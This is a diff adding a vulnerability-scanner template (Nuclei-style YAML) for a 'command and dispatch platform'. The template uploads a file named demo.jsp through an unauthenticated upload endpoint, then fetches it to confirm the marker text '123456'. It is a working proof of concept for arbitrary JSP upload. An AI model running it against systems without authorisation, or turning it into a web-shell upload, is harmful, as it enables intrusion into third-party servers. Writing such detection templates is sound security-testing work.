@@ -1,0 +1,45 @@
+id: Company-CommandAnddispatchPlatform1
+
+info:
+  name: Company-可视化融合指挥调度平台1
+  author: xxx
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags,intrusive
+
+http:
+  - raw:
+      - |
+        POST /dispatch/layuiIm/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJO1EnSSc6s8godJ5
+        Content-Length: 155
+        Connection: close
+
+        ------WebKitFormBoundaryJO1EnSSc6s8godJ5
+        Content-Disposition: form-data; name="file";filename="demo.jsp"
+
+        123456
+        ------WebKitFormBoundaryJO1EnSSc6s8godJ5--
+
+      - |
+        GET {{replace(plt,"http://null","")}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        part: body
+        name: plt
+        internal: true
+        json: 
+          - '.data.src'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"123456")
